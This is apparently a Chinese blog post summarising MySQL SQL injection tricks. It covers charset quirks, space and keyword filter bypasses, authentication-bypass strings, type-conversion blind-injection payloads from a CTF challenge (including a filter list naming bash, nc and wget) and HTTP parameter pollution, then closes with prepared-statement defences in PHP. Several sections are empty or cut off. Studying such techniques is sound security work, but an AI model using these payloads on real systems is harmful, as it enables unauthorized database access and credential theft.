前段时间看到ph师傅的博客是讨论mysql字符编码的文章，大概意思如下，原文在[这里
](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)
当出现有以下代码时，指设置了字符编码为utf-8，但并不是全部为utf-8，而在具体的转换过程中会出现意外的情况，具体可以看ph师傅的文章
    $mysqli->query("set names utf8");
在sql查询中
test.php?username=admin%e4中的%e4会被admin忽略掉而绕过了一些逻辑，还有一些类似于$e4这样的字符如%c2等
**绕空格**
**特殊字符绕过空格**
Example:
    '%0AUNION%0CSELECT%A0NULL%20%23
**括号绕过空格**
Example:
    UNION(SELECT(column)FROM(table))
**and/or后插入字符绕过空格**
任意混合+ – ~ !可以达到绕过空格的效果（可以现在本地测试，混合后需要的奇偶数可能不同）
    SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and-++-1=1;需要偶数个--    SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and!!~~~~!1=1;需要奇数个！
其实一下的字符都可以测试
**注释符 &引号**
    SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and/**/1=1;
    SELECT DISTINCT(db) FROM mysql.db WHERE `Host`='localhost' and"1=1";
**编码绕过**
**关键字绕过**
测试用例information_schema.tables
**认证绕过**
绕过语句：'='
    select data from users where name="="
    select data from users where flase="
    select data from users where 0=0
绕过语句：'-'
    select data from users where name=''-''
    select data from users where name=0-0
    select data from users where 0=0
比如登录的时候需要输入email和passwd，可以这样输入
    email=''&password=''
类型转换
    ' or 1=true
    ' or 1
    select * from users where 'a'='b'='c'
    select * from users where ('a'='b')='c'
    select * from users where (false)='c'
    select * from users where (0)='c'
    select * from users where (0)=0
    select * from users where true
    select * from users
我们还有关于此的漏洞，就以一次CTF的题目来说(源码如下)：
    str=$str;
        }
        function ord_clean($ord){
            $filter = " |bash|perl|nc|java|php|>|>>|wget|ftp|python|sh";
            if (preg_match("/".$filter."/i",$ord) == 1){
                return $this->order = "";
            }
            return $this->order = $ord;
        }
    }
这里过滤了很多关键词了，需要用到类型转换了，这里我们用+号
Payload如下：
    uname=aa'+(ascii(mid((passwd)from(1)))>0)+'1
执行的SQL语句如下：
    xxxxxx where username = 'aa'+(ascii(mid((passwd)from(users)))>0)+'1'
这样就可以开始写脚本跑数据了
除了＋号，其他算术操作符号也会发生类型的类型转换，例如MOD，DIV，＊，／，％，－，
关于隐式类型转换的文章可以看[这里](http://www.freebuf.com/articles/web/8773.html)
**HTTP参数污染**
当我们传入的参数为
[http://sqlinjection.com/?par1=val1&par1=val2](http://sqlinjection.com/?par1=val1&par1=val2)
进入到不同的Web Server就可能得到不同的结果，这里借鉴一下国外大佬一篇文章的总结，如下：
不同的web server的处理结果截然不同
这里也推荐一篇国外的[文章](http://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf)
**实战正则过滤绕过**
**防御手段(代码以PHP为例)**
像WAF之类防御手段自己无能为力经常打补丁就好，这里主要提一下代码层面的问题
推荐使用下面的方式进行查询：
**MYSQLi**
    $stmt = $db->prepare('update name set name = ? where id = ?');
    $stmt->bind_param('si',$name,$id);
    $stmt->execute();
**ODBC**
    $stmt = odbc_prepare( $conn, 'SELECT * FROM users WHERE email = ?' );
    $success = odbc_execute( $stmt, array($email) );
或者
    $dbh = odbc_exec($conn, 'SELECT * FROM users WHERE email = ?', array($email));
    $sth = $dbh->prepare('SELECT * FROM users WHERE email = :email');
    $sth->execute(array(':email' => $email));
**PDO**
    $dbh = new PDO('mysql:dbname=testdb;host=127.0.0.1', $user, $password);
    $stmt = $dbh->prepare('INSERT INTO REGISTRY (name, value) VALUES (:name, :value)');
    $stmt->bindParam(':name', $name);
    $stmt->bindParam(':value', $value);
    // insert one row
    $name = 'one';
    $value = 1;
    $stmt->execute();
或者
    $dbh = new PDO('mysql:dbname=testdb;host=127.0.0.1', $user, $password);
    $stmt = $dbh->prepare('UPDATE people SET name = :new_name WHERE id = :id');
    $stmt->execute( array('new_name' => $name, 'id' => $id) );
**框架**
对于框架的话只要遵循框架的API就好，例如wp的查询
    global $wpdb;
    $wpdb->query(
        $wpdb->prepare( 'SELECT name FROM people WHERE id = %d OR email = %s',
            $person_id, $person_email
        )
    );
或者
    global $wpdb;
    $wpdb->insert( 'people',
            array(
                'person_id' => '123',
                'person_email' => 'PI:EMAIL'
            ),
        array( '%d', '%s' )
    );
**参考**
这篇文章主要是做一个总结，有的点可能描述的不是很细致，可以自己再深入研究
[https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf](https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf)
[https://www.ptsecurity.com/upload/corporate/ww-en/download/PT-devteev-CC-WAF-ENG.pdf](https://www.ptsecurity.com/upload/corporate/ww-en/download/PT-devteev-CC-WAF-ENG.pdf)
[https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf](https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf)
[https://www.exploit-db.com/papers/17934/](https://www.exploit-db.com/papers/17934/)
[http://wooyun.jozxing.cc/static/drops/tips-7299.html](http://wooyun.jozxing.cc/static/drops/tips-7299.html)
[http://www.cnblogs.com/helingfeng/p/6486854.html](http://www.cnblogs.com/helingfeng/p/6486854.html)
[http://voice0fblackhat.blogspot.com/2012/01/tut-waf-bypassing-tut-sharing.html](http://voice0fblackhat.blogspot.com/2012/01/tut-waf-bypassing-tut-sharing.html)